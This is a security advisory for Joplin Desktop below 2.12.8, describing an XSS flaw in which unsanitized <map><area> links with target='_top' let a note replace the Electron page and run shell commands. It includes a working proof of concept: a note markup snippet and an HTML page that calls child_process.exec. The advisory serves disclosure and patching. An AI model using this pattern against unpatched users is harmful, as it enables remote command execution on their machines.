# XSS when clicking on an untrusted `<map>` link

GHSA-2h88-m32f-qh5m

## Package

joplin-desktop
(Joplin Desktop)

## Affected versions

< 2.12.8

## Patched versions

2.12.8

## Description

### Summary

An XSS vulnerability allows clicking on an untrusted image link to execute arbitrary shell commands.

### Details

The HTML sanitizer (`packages/renderer/htmlUtils.ts::sanitizeHtml`) preserves `<map>` `<area>` links. However, unlike `<a>` links, the `target` and `href` attributes are not removed. Additionally, because the note preview pane isn't [sandboxed](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox) to prevent top navigation, links with `target` set to `_top` can replace the toplevel electron page.

Because any toplevel electron page, with Joplin's setup, has access to `require` and can require node libraries, a malicious replacement toplevel page can import `child_process` and execute arbitrary shell commands.

This was fixed in commit [7c52c3e](https://github.com/laurent22/joplin/commit/7c52c3e9a81a52ef1b42a951f9deb9d378d59b0f).

### PoC

1. Create a local website that serves the following HTML at `127.0.0.1:8000` (this can be done by running `python3 -m http.server` from the same directory that contains the `index.html` file).

```
<!-- index.html -->
<!DOCTYPE html>
<html>
    <body>
<script>
    // Change `ls -la` to some other command if running on Windows.
    require('child_process').exec('ls -la', (err, stdout) => {document.body.innerText = stdout})
</script>
    </body>
</html>
```

2. Create a note with the following markdown:

```
<map name="redirect">
  <area
    shape="circle"
    coords="0,0,1000"
    target="_top"
    href="http://127.0.0.1:8000/"
    alt="Replace Joplin with a website" />
</map>
<img
    usemap="#redirect"
    src="https://via.placeholder.com/350x150"
    alt="Click me!" />
```

3. Click on the rendered image

### Impact

This is an XSS vulnerability that impacts users that click on images in the markdown preview pane while viewing untrusted notes while connected to the internet.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
